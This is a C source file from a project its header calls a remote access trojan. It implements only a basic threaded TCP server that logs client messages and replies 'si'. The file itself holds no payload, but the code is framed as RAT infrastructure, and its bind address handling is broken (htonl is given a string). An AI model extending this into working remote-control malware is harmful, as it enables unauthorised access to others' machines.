/*
 *  Luther Blissed  --  Remote Access Trojan
 *  Copyright (C) 2024  Davide Usberti aka UsboKirishima
 *
 *  Luther Blissed is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  Luther Blissed is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with Luther Blissed.  If not, see <http://www.gnu.org/licenses/>.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <stddef.h>
#include <stdalign.h>
#include <regex.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <sys/sysinfo.h>
#include <sys/statvfs.h>
#include <sys/mount.h>
#include <linux/loop.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <pthread.h>
#include <arpa/inet.h>

#include <logs/slog.h>
#include <errors/errors.h>
#include <server/server.h>
#include <server/listener.h>

#define MAX 80
#define SA struct sockaddr

void *handle_client(void *arg) 
{ 
    int connfd = *((int *)arg);
    free(arg);

    char buff[MAX]; 
    char response[] = "si";
    struct sockaddr_in cliaddr;
    socklen_t cliaddr_len = sizeof(cliaddr);
    getpeername(connfd, (struct sockaddr*)&cliaddr, &cliaddr_len);

    printf("Connected to client: %s:%d\n", inet_ntoa(cliaddr.sin_addr), ntohs(cliaddr.sin_port));

    for (;;) { 
        bzero(buff, MAX); 
   
        int n = read(connfd, buff, sizeof(buff)); 
        if (n <= 0) {
            printf("Client %s:%d disconnected or error occurred\n", inet_ntoa(cliaddr.sin_addr), ntohs(cliaddr.sin_port));
            break;
        }

        printf("From client %s:%d: %s\n", inet_ntoa(cliaddr.sin_addr), ntohs(cliaddr.sin_port), buff); 
   
        write(connfd, response, sizeof(response)); 
   
        if (strncmp("exit", buff, 4) == 0) { 
            printf("Client %s:%d sent exit. Closing connection.\n", inet_ntoa(cliaddr.sin_addr), ntohs(cliaddr.sin_port));
            break; 
        } 
    } 
    close(connfd);
    return NULL;
} 


int lb_server(char HOST[], unsigned short PORT)
{
    int sockfd, connfd, len; 
    struct sockaddr_in servaddr, cli; 
   
    sockfd = socket(AF_INET, SOCK_STREAM, 0); 
    if (sockfd == -1) { 
        printf("Socket creation failed...\n"); 
        exit(0); 
    } 
    else
        printf("Socket successfully created..\n"); 
    bzero(&servaddr, sizeof(servaddr)); 
   
    // assign IP, PORT 
    servaddr.sin_family = AF_INET; 
    servaddr.sin_addr.s_addr = htonl(HOST); 
    servaddr.sin_port = htons(PORT); 
   
    if ((bind(sockfd, (SA*)&servaddr, sizeof(servaddr))) != 0) { 
        printf("Socket bind failed...\n"); 
        exit(0); 
    } 
    else
        printf("Socket successfully binded..\n"); 
   
    if ((listen(sockfd, 5)) != 0) { 
        printf("Listen failed...\n"); 
        exit(0); 
    } 
    else
        printf("Server listening..\n"); 
    len = sizeof(cli); 
   
    while (1) {
        connfd = accept(sockfd, (SA*)&cli, &len); 
        if (connfd < 0) { 
            printf("Server accept failed...\n"); 
            exit(0); 
        } 
        else {
            printf("Server accepted the client...\n");
            pthread_t thread_id;
            int *arg = malloc(sizeof(*arg));
            *arg = connfd;
            pthread_create(&thread_id, NULL, handle_client, arg);
            pthread_detach(thread_id);  
        }
    }
    close(sockfd); 
    return 0; 
}